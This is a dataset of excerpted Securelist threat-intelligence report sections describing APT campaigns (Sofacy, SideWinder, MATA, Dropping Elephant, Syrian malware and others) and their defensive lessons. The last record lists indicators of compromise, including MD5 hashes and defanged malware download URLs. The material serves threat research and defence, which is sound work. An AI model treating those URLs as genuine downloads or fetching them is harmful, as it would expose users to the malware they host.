Flame \u2013 for example, its arsenal included two zero-day vulnerabilities that were later to be used in Stuxnet. \nWhile investigating an incident in the Middle East, we uncovered the activity of a previously unknown group conducting targeted attacks. Desert Falcons is the first Arabic-speaking group that has been seen conducting full-scale cyber-espionage operations \u2013 apparently connected with the political situation in the region. The first signs of this campaign date back to 2011. The first infections took place in 2013, although the peak of activity was in late 2014 and early 2015. The group has stolen over 1 million files from more than 3,000 victims. The victims include political activists and leaders, government and military organizations, mass media and financial institutions \u2013 located primarily in Palestine, Egypt, Israel and Jordan. It's clear that members of the Desert Falcons group aren't beginners: they developed Windows and Android malware from scratch, and skillfully organized attacks that relied on phishing e-mails, fake web sites and fake social network accounts. ", "source": "securelist"}, {"title": "Conclusion", "content": "In 2015, perhaps for the first time in the entire history of the Internet, issues related to protecting networks and being protected online were discussed in connection with every sector of the economy and with people's everyday life. Choose any sector of modern civilization \u2013 finances, industrial production, cars, planes, wearable devices, healthcare and many others \u2013 and you will be sure to find publications this year on incidents or cybersecurity problems related to that sector. \nRegrettably, cybersecurity has now become inseparably linked with terrorism. Defensive, as well as offensive, methods used online are attracting lots of interest from various illegal organizations and groups. \nCybersecurity issues have risen to the level of top diplomats and government officials. In 2015, cybersecurity agreements were signed between Russia and China, China and the US, China and the UK. In these documents, governments not only agree to cooperate, but also accept the responsibility to refrain from any attacks on each other. At the same time, there was extensive discussion of recent changes to the Wassenaar Arrangement restricting spyware exports. A recurring theme of the year was the use of insecure email services by various political figures across the globe, including the then US Secretary of State Hillary Clinton. \nAll this has led to a huge surge in interest in cybersecurity issues, not only from the mass media but also from the entertainment industry. There were feature films and TV series produced, some of them starring cybersecurity experts, sometimes as themselves. \nThe word cybersecurity became fashionable in 2015, but this does not mean the problem has been solved. We are seeing what amounts to exponential growth in everything related to cybercrime, including increases in the number of attacks and attackers, the number of victims, defense and protection related costs, laws and agreements that regulate cybersecurity or establish new standards. For us, this is primarily about the sophistication of the attacks we detect. The confrontation is now in the active stage, with the final stage not even on the horizon. \nYour email address will not be published. Required fields are marked ", "source": "securelist"}, {"title": "Introduction", "content": "At this point, it has become clich\u00e9 to say that nothing in 2022 turned out the way we expected. We left the COVID-19 crisis behind hoping for a long-awaited return to normality and were immediately plunged into the chaos and uncertainty of a twentieth-century-style military conflict that posed serious risks of spreading over the continent. While the broader geopolitical analysis of the war in Ukraine and its consequences are best left to experts, a number of cyberevents have taken place during the conflict, and our assessment is that they are very significant. \nIn this report, we propose to go over the various activities that were observed in cyberspace in relation to the conflict in Ukraine, understand their meaning in the context of the current conflict, and study their impact on the cybersecurity field as a whole. \nIn the modern world, it has become very difficult to launch any kind of military campaign without intelligence support in the field. Most intelligence is gathered from various sources through methods such as HUMINT (human intelligence, gathered from persons located in the future conflict area), SIGINT (signals intelligence, gathered through the interception of signals), GEOINT (geospatial intelligence, such as maps from satellites), or ELINT (electronic intelligence, excluding text or voice), and so on. \nFor instance, according to the New York Times, in 2003, the United States made plans for a huge cyberattack to freeze billions of dollars in Saddam Hussein's bank accounts and cripple his government before the invasion of Iraq. However, the plan was not approved because the government feared collateral damage. Instead, a more limited plan to cripple Iraq's military and government communication systems was carried out during the early hours of the war in 2003. This operation included blowing up cellphone towers and communication grids as well as jamming and cyberattacks against Iraq's telephone networks. According to the same article, another such attack took place in the late 1990s when the American military attacked a Serbian telecommunications network. Inadvertently, this also affected the Intelsat communications system for days, proving that the risk of collateral damage during cyberwarfare is pretty high. \nThe lessons learned from these events may allow predicting kinetic conflicts by monitoring new cyberattacks in potential areas of conflict. For instance, in late 2013 and January 2014, we observed higher-than-normal activity in Ukraine by the Turla APT group, as well as a spike in the number of BlackEnergy APT sightings. Similarly, at the beginning of February 2022, we noticed a huge spike in the amount of activity related to Gamaredon C&C servers. This activity reached hitherto-unseen levels, suggesting massive preparations for a major SIGINT gathering effort. \nAs shown by these cases, during modern conflicts, we can expect to see significant signs and spikes in cyberwarfare relating to both collection of intelligence and destructive attacks in the days and weeks preceding military attacks. Of course, we should note that the opposite is also possible: for instance, starting in June 2016, but most notably since September 2016 all the way to December 2016, the Turla group intensified their satellite-based C&C registrations tenfold compared to its 2015 average. This indicated unusually high activity by the Turla group, which signaled a never-before-seen mobilization of the group's resources. At the same time, there was no ensuing military conflict that we know of. ", "source": "securelist"}, {"title": "Conclusion", "content": "The conflict in Ukraine will have a lasting effect on the cybersecurity industry and landscape as a whole. Whether the term \"cyberwar\" applies or not, there is no denying that the conflict will forever change everyone's expectations about cyberactivity conducted in wartime, when a major power is involved. Unfortunately, there is a chance that established practice will become the de facto norm. \nBefore the war broke out, several ongoing multiparty processes (UN's OEWG and GGE) attempted to establish a consensus on acceptable and responsible behavior in cyberspace. Given the extreme geopolitical tensions we are currently experiencing, it is doubtful that these already difficult discussions will bear fruit in the near future. \nA promising initiative in the meantime is the ICRC's \"digital emblem\" project: a proposed solution to clearly identify machines used for medical or humanitarian purposes, in the hopes that attackers will refrain from damaging them. Just like the real-life red cross and red crescent emblems cannot stop bullets, digital emblems will not prevent cyberattacks on a technical level \u2013 but they will at least make it obvious to everyone that medical infrastructure is not a legitimate target. \nAs it seems more and more likely that the conflict will drag on for years, and with the death toll already being high... we hope that everyone can at least agree on that. \nin many cases, but to study how these cyberattacks are used to shape narratives. \n2] This report does not make the assumption that the Russian miltary woulduse coulduse orhas ever used wiper malware. US-CERT however went on the record on this exact subject. So did a \n[3] We recognize that informationabout ongoing cyberattacks and their impact isn't exactly forthcoming. This assessment may be revised at a later date, when more data becomes availabl ", "source": "securelist"}, {"title": "Introduction", "content": "Sofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year. \nThis high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as \"Sofacy\" or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point. \nIn 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We've seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets. \nSofacy's reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group's activities in 2016, especially when data from the compromise was leaked and \"weaponized\". And later 2016, their focus turned towards the Olympics' and the World AntiDoping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like \"anonpoland\", and data from victimized organizations were similarly leaked and \"weaponized\". \nThis write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has $100\\%$ global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer's Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East. ", "source": "securelist"}, {"title": "Conclusion", "content": "Sofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We'll cover more recent 2018 change in their targeting and the malware itself at SAS 2018. \nWith a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important. ", "source": "securelist"}, {"title": "Introduction", "content": "It's been a while since the last massive Internet outage took down Syria's backbone network (AS29386). More recently, however, Syria suffered yet another large-scale Internet black out that lasted for about seven hours. In contrast to previous incidents, where networking routes began to disappear gradually from border routing devices, this time a cut off fiber optic cable was deemed responsible for leaving most of the country off-line. \nGiven the complexity of the current political situation, there are many different factors which could be involved in this event, but from the outside these are all largely speculative. Pro-government groups will talk about sabotage and opposition activists will talk about censorship. Here, we'll only focus on malware and the facts that have been found during the analysis, presenting only relevant information in the hope of setting a clear context for this research. \nIn spite of that small disclaimer, there is a vast amount of targeted Syrian malware in the wild these days, so we have a lot of material to work on and to use as the basis for our investigation. The \nremainder of this text demonstrates that the sample subset features a large number of different techniques, and different indicators of compromise. This gives analysts a clear idea of what to look for, which greatly assist the creation of rules for early detection. These samples share many characteristics, suggesting that targeted Syrian malware is no longer a myth but a worrying reality. \nPro-government hacking groups have been distributing a wide array of malware for quite a long time now. Using mainly social engineering techniques and taking advantage of the impersonation of legitimate contacts, victims end up executing malicious payloads sent specifically to them. Propagation via Facebook or Skype are among the most common ways of approaching the target, and since most of the samples show the distinct \"feature\" of stealing credentials, it seems like we are dealing with a never ending game of identity theft and malware dissemination. \nThe majority of the malicious applications found try to pose as legitimate downloads, cleverly luring the user into thinking they are installing some kind of protection software needed to maintain their privacy and anonymity online. Syrian citizens are reasonably concerned about these topics, which is one reason why these attacks are so effective. Social engineering combined with spear-phishing is a dangerous recipe, and in addition new threats are appearing every day. \nMoreover, some Facebook pages have been set up to resemble anti-hacking or computer security enthusiast groups. By accessing malicious download links shared in the comments section, Syrian citizens looking for security solutions end up infecting their own systems. ", "source": "securelist"}, {"title": "Conclusion", "content": "This is by no means a comprehensive analysis of all the samples currently found in the wild. Instead it is a wide overview of the tools and methods that hacking groups are currently using to target their victims. Using SFX archives in early stages combined with social engineering and spear phishing techniques yields maximum infection rates while arousing little suspicion. The usage of high level programming languages (i.e. C#) is becoming more popular among attackers as they need to modify their malicious creations more rapidly. This brings the added benefit of leveraging already available s://securelist.com/the-story-behind-syrian-malware-net-trojans-and-social-engineering/59360/ \nsource code from the underground scene. The possibility of embedding remote administration tools into the malware used for distribution enables extreme customization of the code, making this type threat something that we constantly need to watch for. \nSOCIAL ENGINEERING \nTARGETED ATTACKS ", "source": "securelist"}, {"title": "Introduction", "content": "Dropping Elephant (also known as \"Chinastrats\" and \"Patchwork\") is a relatively new threat actor that is targeting a variety of high profile diplomatic and economic targets using a custom set of attack tools. Its victims are all involved with China's foreign relations in some way, and are generally caught through spear-phishing or watering hole attacks. \nOverall, the activities of this actor show that low investment and ready-made offensive toolsets can be very effective when combined with high quality social engineering. We have seen more such open source toolset dependency with meterpreter and BeEF, and expect to see this trend continue. ", "source": "securelist"}, {"title": "Conclusion", "content": "Campaigns do not always need to be technically advanced to be successful. In this case, a small group reusing exploit code, some powershell-based malware and mostly social engineering has been able to steal sensitive documents and data from victims since at least November 2015. \nOur analysis of the C2 server confirmed the high profile of most victims, mainly based in the Asian region and specially focused on Chinese interests. Actually, some hints suggest the group has been successful enough to have recently expanded its operations, perhaps after proving its effectiveness and the value of the data stolen. \nThis is quite worrying, especially given the fact that no 0 days or advanced techniques were used against such high profile targets. Simply applying software patches will prevent attacks based on old exploits, as well as training in the most basic social engineering attacks. \nHowever, it should be noted that in this case Microsoft\u00b4s patch for exploit CVE-2014-1761 just warns the user not to allow the execution of the suspicious file. \nDropping Elephant artifacts are detected by Kaspersky Lab products as:   \nExploit.Win32.CVE-2012-0158.\\*   \nExploit.MSWord.CVE-2014-1761.\\*   \nTrojan-Downloader.Win32.Genome.\\*   \nHEUR:Trojan.Win32.Generic \nAs usual Kaspersky Lab actively collaborates with CERTs and LEAs to notify victims and help to mitigate the threat. If you need more information about this actor, please contact intelreports@kaspersky.com \nMore information on how Kaspersky Lab technologies protect against such cyberespionage attacks is available on Kaspersky Business blog. ", "source": "securelist"}, {"title": "Introduction", "content": "22 JUL 2020 minute read \nAs the IT and OT environment becomes more complex, adversaries are quick to adapt their attack strategy. For example, as users' work environments diversify, adversaries are busy acquiring the TTPs to infiltrate systems. Recently, we reported to our Threat Intelligence Portal customers a similar malware framework that internally we called MATA. The MATA malware framework possesses several components, such as loader, orchestrator and plugins. This comprehensive framework is able to target Windows, Linux and macOS operating systems. \nThe first artefacts we found relating to MATA were used around April 2018. After that, the actor behind this advanced malware framework used it aggressively to infiltrate corporate entities around the world. We identified several victims from our telemetry and figured out the purpose of this malware framework. ", "source": "securelist"}, {"title": "Victims", "content": "Based on our telemetry, we have been able to identify several victims who were infected by the MATA framework. The infection is not restricted to a specific territory. Victims were recorded in Poland, Germany, Turkey, Korea, Japan and India. Moreover, the actor compromised systems in various industries, including a software development company, an e-commerce company and an internet service provider. \nWe assess that MATA was used by an APT actor, and from one victim we identified one of their intentions. After deploying MATA malware and its plugins, the actor attempted to find the victim's databases and execute several database queries to acquire customer lists. We're not sure if they completed the exfiltration of the customer database, but it's certain that customer databases from victims are one of their interests. In addition, MATA was used to distribute VHD ransomware to one victim, something that will be described in detail in an upcoming blog post. ", "source": "securelist"}, {"title": "Attribution", "content": "ttps://securelist.com/mata-multi-platform-targeted-malware-framework/97746/\nWe assess that the MATA framework is linked to the Lazarus APT group. The MATA orchestrator uses two unique filenames, c_2910.cls and k_3872.cls, which have only previously been seen in several Manuscrypt variants, including the samples (0137f688436c468d43b3e50878ec1a1f) mentioned in the US-CERT publication. ", "source": "securelist"}, {"title": "Conclusion", "content": "The MATA framework is significant in that it is able to target multiple platforms: Windows, Linux and macOS. In addition, the actor behind this advanced malware framework utilized it for a type of cybercrime attack that steals customer databases and distributes ransomware. We evaluate that this malware is going to evolve, so we will be monitoring its activity in order to protect our customers. \nFor more information please contact: intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "26 JUN 2019 minute read \nIn May 2018, we discovered a campaign targeting dozens of mobile Android devices belonging to Israe citizens. Kaspersky spyware sensors caught the signal of an attack from the device of one of the victims; and a hash of the APK involved (Android application) was tagged in our sample feed for inspection. Once we looked into the file, we quickly found out that the inner-workings of the APK included a malicious payload, embedded in the original code of the application. This was an original spyware program, designed to exfiltrate almost all accessible information. \nDuring the course of our research, we noticed that we were not the only ones to have found the operation. Researchers from Bitdefender also released an analysis of one of the samples in a blogpost. \nAlthough something had already been published, we decided to do something different with the data we acquired. The following month, we released a private report on our Threat Intelligence Portal to alert our clients about this newly discovered operation and began writing YARA rules in order to catch more samples. We decided to call the operation \"ViceLeaker\", because of strings and variables in its code. ", "source": "securelist"}, {"title": "Conclusion", "content": "The operation of ViceLeaker is still ongoing, as is our research. The attackers have taken down their communication channels and are probably looking for ways to assemble their tools in a different manner. Kaspersky detects and blocks samples of the ViceLeaker operation using the following verdict: Trojan-Spy.AndroidOS.ViceLeaker.\\* \nActually, we are currently investigating whether this group might also be behind a large-scale weboriented attack at the end of 2018 using code injection and exploiting SQL vulnerabilities. Even when this would not be directly related to the Android malware described in this blogpost, it would be an indicator of wider capabilities and objectives of this actor. ", "source": "securelist"}, {"title": "Introduction", "content": "Last year, we published an article about SideWinder, a highly prolific APT group whose primary targets have been military and government entities in Pakistan, Sri Lanka, China, and Nepal. In it, we described activities that had mostly happened in the first half of the year. We tried to draw attention to the group, which was aggressively extending its activities beyond their typical targets, infecting government entities, logistics companies and maritime infrastructures in South and Southeast Asia, the Middle East, and Africa. We also shared further information about SideWinder's post-exploitation activities and described a new sophisticated implant designed specifically for espionage. \nWe continued to monitor the group throughout the rest of the year, observing intense activity that included updates to SideWinder's toolset and the creation of a massive new infrastructure to spread malware and control compromised systems. The targeted sectors were consistent with those we had seen in the first part of 2024, but we noticed a new and significant increase in attacks against maritime infrastructures and logistics companies. \nIn 2024, we initially observed a significant number of attacks in Djibouti. Subsequently, the attackers shifted their focus to other entities in Asia and showed a strong interest in targets within Egypt. \nMoreover, we observed other attacks that indicated a specific interest in nuclear power plants and nuclear energy in South Asia and further expansion of activities into new countries, especially in Africa. \nCountries and teritories targeted by SideWinder in the maritime and logistics sectors in 2024 \nIt is worth noting that SideWinder constantly works to improve its toolsets, stay ahead of security software detections, extend persistence on compromised networks, and hide its presence on infected systems. Based on our observation of the group's activities, we presume they are constantly monitoring detections of their toolset by security solutions. Once their tools are identified, they respond by generating a new and modified version of the malware, often in under five hours. If behavioral detections occur, SideWinder tries to change the techniques used to maintain persistence and load components. Additionally, they change the names and paths of their malicious files. Thus, monitoring and detection of the group's activities reminds us of a ping-pong game. ", "source": "securelist"}, {"title": "Victims", "content": "SideWinder continues to attack its usual targets, especially government, military, and diplomatic entities. The targeted sectors are consistent with those observed in the past, but it is worth mentioning that the number of attacks against the maritime and the logistics sectors has increased and expanded to Southeast Asia. \nFurthermore, we observed attacks against entities associated with nuclear energy. The following industries were also affected: telecommunication, consulting, IT service companies, real estate agencies, and hotels. \nCountries and territories targeted by SideWinder in 2024 \nOverall, the group has further extended its activities, especially in Africa. We detected attacks in Austria, Bangladesh, Cambodia, Djibouti, Egypt, Indonesia, Mozambique, Myanmar, Nepal, Pakistan, Philippines, Sri Lanka, the United Arab Emirates, and Vietnam. \nIn this latest wave of attacks, SideWinder also targeted diplomatic entities in Afghanistan, Algeria, Bulgaria, China, India, the Maldives, Rwanda, Saudi Arabia, Turkey, and Uganda. ", "source": "securelist"}, {"title": "Conclusion", "content": "SideWinder is a very active and persistent actor that is constantly evolving and improving its toolkits. Its basic infection method is the use of an old Microsoft Office vulnerability, CVE-2017-11882, which once again emphasizes the critical importance of installing security patches. \nDespite the use of an old exploit, we should not underestimate this threat actor. In fact, SideWinder has already demonstrated its ability to compromise critical assets and high-profile entities, including those in the military and government. We know the group's software development capabilities, which became evident when we observed how quickly they could deliver updated versions of their tools to evade detection, often within hours. Furthermore, we know that their toolset also includes advanced malware, like the sophisticated in-memory implant \"StealerBot\" described in our previous article. These capabilities make them a highly advanced and dangerous adversary. \nTo protect against such attacks, we strongly recommend maintaining a patch management process to apply security fixes (you can use solutions like Vulnerability Assessment and Patch Management and Kaspersky Vulnerability Data Feed) and using a comprehensive security solution that provides incident detection and response, as well as threat hunting. Our product line for businesses helps identify and prevent attacks of any complexity at an early stage. The campaign described in this article relies on spear-phishing emails as the initial attack vector, which highlights the importance of regular employee training and awareness programs for corporate security. \nWe will continue to monitor the activity of this group and to update heuristic and behavioral rules for effective detection of malware. \n\\*\\*More information, loCs and YARA rules for SideWinder are available to customers of the Kaspersky Intelligence Reporting Service. Contact: intelreports@kaspersky.com. ", "source": "securelist"}, {"title": "Introduction", "content": "In the course of our routine investigation, we discovered a DLL file, identified as hrserv.dll, which is a previously unknown web shell exhibiting sophisticated features such as custom encoding methods for client communication and in-memory execution. Our analysis of the sample led to the discovery of related variants compiled in 2021, indicating a potential correlation between these separate occurrences of malicious activity. ", "source": "securelist"}, {"title": "Attribution", "content": "The TTPs analyzed in this investigation are not associated with any known threat actors we are tracking, but there are a few things that we observed: \nthe GET parameters used in the hrserv.dll file, which is used to mimic Google services, include \"hl This specifies the host language of the user interface. Although this parameter has no functionality within the attack vector, the assigned value \"en-TW\" specifies that the Google search interface should be displayed in English, but the search results should be displayed in Traditional Chinese: \n1 &cp=1&client=desktop-gws-wiz-on-focus-serp&xssi=t&hl=en-TW&authuser=0&pq= the samples include help strings for specific conditions, in English. We saw multiple typos that suggest the actor behind the samples is not a native English speaker. \nAn error message with a typo ", "source": "securelist"}, {"title": "Conclusion", "content": "The analyzed sample represents a capable web shell. Based on the compile timestamps, its origins date back to at least 2021. This sophisticated malware variant exhibits the ability to initiate in-memory executions. In the observed scenario, communication is established through registry manipulations and temporary files. \nNotably, the web shell and memory implant use different strings for specific conditions. In addition, the memory implant features a meticulously crafted help message. Considering these factors, the malware's characteristics are more consistent with financially motivated malicious activity. However, its operational methodology exhibits similarities with APT behavior. Despite the malware's prolonged activity over several years, multiple instances involving these samples have not been documented. Our efforts are ongoing as we continue to monitor related activity, with the goal of unraveling the mystery in future investigations. ", "source": "securelist"}, {"title": "Introduction", "content": "Kaspersky Lab would like to alert users in the Middle East for new malware attacks being delivered through Syrian news and social networking forums. Malware writers are using multiple techniques to deliver their files and entice the victims to run them, creating an effective infection vector. Mainly depending on social engineering, the attackers exploit Victims' trust in social networking forums, curiosity in following news related to the conflict in Syria, their standing in Syria, in addition to their lack of Cyber Security awareness. Once criminals infect the victim's computer, attackers have full access and control over victim's devices. \nIn the first report on Syrian malware, Kaspersky Lab detailed many attacks being used in Syria to spy on users, the report included attacks from different teams and many sources. \nThis post will follow up on one of the domains, seemingly the most active in the last period: thejoe.publicvm.com \nThe malware files were found on activist sites and social networking forums, some others were reported by regional organisations like CyberArabs. \nReports that mention \"the Joe\" https://citizenlab.org/2013/06/a-call-to-harm/ ", "source": "securelist"}, {"title": "Conclusion", "content": "Syrian malware has a strong reliance on social engineering and the active development of malicious variants. Nevertheless, most of them quickly reveal their true nature when inspected carefully; and this is one of the main reasons for urging Syrian users to be extra vigilant about what they download and to implement a layered defense approach. We expect these attacks to evolve both in quality and quantity. ", "source": "securelist"}, {"title": "Introduction", "content": "On October 1, 2020, the DHS CISA agency released information about a malware family called SlothfulMedia, which they attribute to a sophisticated threat actor. We have been tracking this set of activity through our private reporting service, and we would like to provide the community with additional context. \nIn June 2018, we published the first report on a new cluster of activities that we named IAmTheKing, based on malware strings discovered in a malware sample from an unknown family. Amusingly, other strings present inside of it invited \"kapasiky antivirus\" to \"leave [them] alone\". \nOver time, we identified three different malware families used by this threat actor, one of which was SlothfulMedia. The aim of this blog post is to introduce all of them and to provide data we have been able to gather about the attackers' interests. ", "source": "securelist"}, {"title": "Conclusion", "content": "While the public has only recently discovered this set of activity, IAmTheKing has been very active for a few years. Considering the type of organizations that cybercriminals have been targeting, we felt that there was little public interest in raising awareness about this group beyond our trusted circle of industry partners. However, now that researchers have started investigating this threat actor, we want to assist the community as much as possible by providing this brief summary of our knowledge of IAmTheKing. \nBased on the type of information IAmTheKing is after, we believe that it is state-sponsored. Its toolset is rapidly evolving, and it is not afraid to experiment with non-standard communications channels. The group is characterized by a mastery of traditional pentesting methodologies and a solid command of Powershell. Data available to us indicates that it has achieved operational success on numerous occasions. \nKaspersky will keep investigating incidents related to this group in the foreseeable future and has gathered a detailed view of their 2020 activity so far. We invite individuals or companies who think they might be \u2013 or have been \u2013 targeted by IAmTheKing to get in touch with us for additional information, or otherwise request access to our Threat Intelligence Portal for regular updates on this threat actor. ", "source": "securelist"}, {"title": "Introduction", "content": "Sofacy, also known as APT28, Fancy Bear, and Tsar Team, is a prolific, well resourced, and persistent adversary. They are sometimes portrayed as wild and reckless, but as seen under our visibility, the group can be pragmatic, measured, and agile. Our previous post on their 2017 activity stepped away from the previously covered headline buzz presenting their association with previously known political hacks and interest in Europe and the US, and examines their under-reported ongoing activity in middle east, central asia, and now a shift in targeting further east, including China, along with an overlap surprise. There is much understated activity that can be clustered within this set and overlap in APT activity. Here, we examine current deployment, code, cryptography, and targeting. \nEssentially, this examination finds the group maintains subdivisions of efforts in targeting, development, and coding. Comparisons to other modules quickly shows a delineation in other Sofacy efforts. SPLM, GAMEFISH, and Zebrocy delivery all maintain their own clusters, but frequently overlap later. \nBecause SPLM is their primary and selective second stage tool, SPLM deployment is of much interest.   \nBut Zebrocy efforts are in such high volume, that these modules need examination as well. ", "source": "securelist"}, {"title": "Conclusion", "content": "Sofacy is such a large, active group that appears to maintain multiple sub-groups and efforts that all fit under the Sofacy \"umbrella\". Sometimes, they share infrastructure, but more often they do not share infrastructure and appear to compete for access within targets. Either way, the group's consistent activity throughout central and eastern asia seems to be poorly represented in the public discussion. \nSPLM did not change in substantial ways for several years, and now it is being split up and used for jus functional modules. And much of the malware being deployed by Sofacy is quickly changed from $\\mathrm{C}/\\mathrm{C}++$ to .Net to powershell. Other open source and semi-legitimate pen-testing tools like nbtscan and powercat are being used for mapping available resources and lateral movement as well. It is easy to expect deliberate changes within this group in 2018, with even more .Net, Delphi,  and powershell ports of various tools appearing at Sofacy targets throughout the year. ", "source": "securelist"}, {"title": "Introduction", "content": "As an incident response service provider, Kaspersky delivers a global service that results in global visibility of adversaries' cyber-incident tactics and techniques used in the wild. In this report, we share our teams' conclusions and analysis based on incident responses and statistics from 2019. As well as a range of highlights, this report will cover the affected industries, the most widespread attack tactics and techniques, how long it took to detect and stop adversaries after initial entry and the most exploited vulnerabilities. The report also provides some high-level recommendations on how to increase resilience to attacks. \nThe insights used in this report come from incident investigations by Kaspersky teams from around the world. The main digital forensic and incident response operations unit is called the Global Emergency Response Team (GERT) and includes experts in Europe, Latin America, North America, \nRussia and the Middle East. The work of the Computer Incidents Investigation Unit (CIIU) and the Global Research and Analysis Team (GReAT) are also included in this report. ", "source": "securelist"}, {"title": "Conclusion", "content": "In 2019, the cyberattack curve was not flattened. There was an increase in the number of incidents accompanied by greater commitment among victims to understand the full attack picture. Victims from all regions suffered from a variety of attacks and all business types were targeted. \nImproved security and audit planning with continuous maintenance of procedures along with rapid patch management could have minimized damages and losses in many of the analyzed incidents. In addition, having security monitoring and an investigation plan either on-premises or performed by a third party could have helped in stopping adversaries in the early phases of the attack chain, or start detections immediately after compromise. \nVarious tactics and techniques were used by adversaries to achieve their targets, trying multiple times till they succeeded. This indicates the importance of security being an organized process with continuous improvements instead of separate, independent actions. \nAdversaries made greater use of legitimate tools in different phases of their cyberattacks, especially in the early phases. This highlights the need to monitor and justify the use of legitimate administration tools and scanning utilities within internal networks, limiting their use to administrators and necessary actions only. \nApplying a powerful auditing policy with a log retention period of at least six months can help reduce analysis times during incident investigation and help limit the types of damage caused. Having insufficient logs on endpoints and network levels means it takes longer to collect and analyze evidence from different data sources in order to gain a complete picture of an attack. ", "source": "securelist"}, {"title": "Introduction", "content": "In the ever-evolving landscape of cybersecurity, logs, that is information collected from various sources like network devices, endpoints, and applications, plays a crucial role in identifying and responding to threats. By analyzing this data, organizations can detect anomalies, pinpoint malicious activity, and mitigate potential cyberattacks before they cause significant damage. However, the sheer volume and complexity of logs often make them challenging to analyze effectively. \nThis is where machine learning (ML) comes into play. ML, a subset of artificial intelligence (AI), with its ability to process and analyze large datasets, offers a powerful solution to enhance threat detection capabilities. ML enables faster and more accurate identification of cyberthreats, helping organizations stay ahead of increasingly sophisticated attackers. \nAt Kaspersky, we have been using ML algorithms in our solutions for close on 20 years, and we have formulated ethical principles for the development and use of AI/ML. We utilize a variety of ML models and methods that are key to automating threat detection, anomaly recognition, and enhancing the accuracy of malware identification. In this post, we will share our experience hunting for new threats by processing Kaspersky Security Network (KSN) global threat data with ML tools to identify subtle new Indicators of Compromise (IoCs). We will also discuss challenges in implementing machine learning and interpreting threat hunting results. \nThe Kaspersky Security Network (KSN) infrastructure is designed to receive and process complex global cyberthreat data, transforming it into actionable threat intelligence that powers our products. A key source of threat-related data comes from voluntary contributions by our customers. To find out more, read about the principles of Kaspersky Security Network and our privacy policy. ", "source": "securelist"}, {"title": "Conclusion", "content": "The integration of ML into cybersecurity has already demonstrated its transformative potential by enabling the detection of novel cyberthreats that traditional methods might overlook. Through the analysis of vast and complex logs, ML models can identify subtle patterns and IoCs, providing organizations with a powerful tool to enhance their security posture. The examples of cyberthreats discovered over the past year underscore the efficacy of ML in uncovering threats across various industries, from government to finance. \nThese technologies will not only improve detection accuracy but also enable more proactive and collaborative defense strategies, allowing organizations to stay ahead of the ever-evolving cyberthreat landscape. \nIn this post, we have evaluated the utilization of ML models on our KSN global threat data, which has led us to reveal thousands of new advanced threats. The journey of refining ML models through meticulous dataset preparation, preprocessing, and model implementation has highlighted the importance of leveraging these technologies to build robust, adaptable, and scalable solutions. \nAs we continue to explore and enhance these capabilities, the potential for machine learning to reshape cybersecurity and protect against increasingly sophisticated threats becomes ever more apparent. The future of cybersecurity lies in our ability to ethically harness these tools effectively, ensuring a safer digital environment for all. ", "source": "securelist"}, {"title": "Introduction", "content": "04 JUL 2019 minute read \nRecently, the United States Cyber Command (USCYBERCOM Malware Alert @CNMF_VirusAlert) highlighted several VirusTotal uploads of theirs \u2013 and the executable objects relating to 2016 \u2013 2017 NewsBeef/APT33 activity are interesting for a variety of reasons. Before continuing, it's important to restate yet again that we defend customers, and research malware and intrusions, regardless of their source. Accordingly, subscribers to our private APT intelligence reports receive unique and extraordinary data on the significant activity and campaigns of over 100 APTs from all over the world, including this 2016-2017 NewsBeef /APT33 activity. \nUSCYBERCOM's VirusTotal executable object uploads appeared in our January 2017 private report \"NewsBeef Delivers Christmas Presence\", an examination of a change in the tactics used in spearphishing and watering hole attacks against Saudi Arabian targets. Two files uploaded by USCYBERCOM are of particular interest. These were first seen Dec 2016 and Jan 2017: \nMD5: d87663ce6a9fc0e8bc8180937b3566b9, served as jquerycode-download[.]live/flashplayer23pp_xa_install.exe jquerycode-download[.]live/chrome_update.exe \nDetected as BSS:Exploit.Win32.Generic, Trojan-Downloader.Win32.Powdr.a, TrojanDownloader.MSIL.Steamilik.zzo \nMD5: 9b1a06590b091d300781d8fbee180e75, served as   \njquerycode-download[.]live/citrixreceiver.exe   \njquerycode-download[.]live/citrixcertificate.exe   \nntg-sa[.]com/downloads/citrix_certificate.exe   \nDetected as BSS:Exploit.Win32.Generic, Trojan-Downloader.PowerShell.Agent.ah,   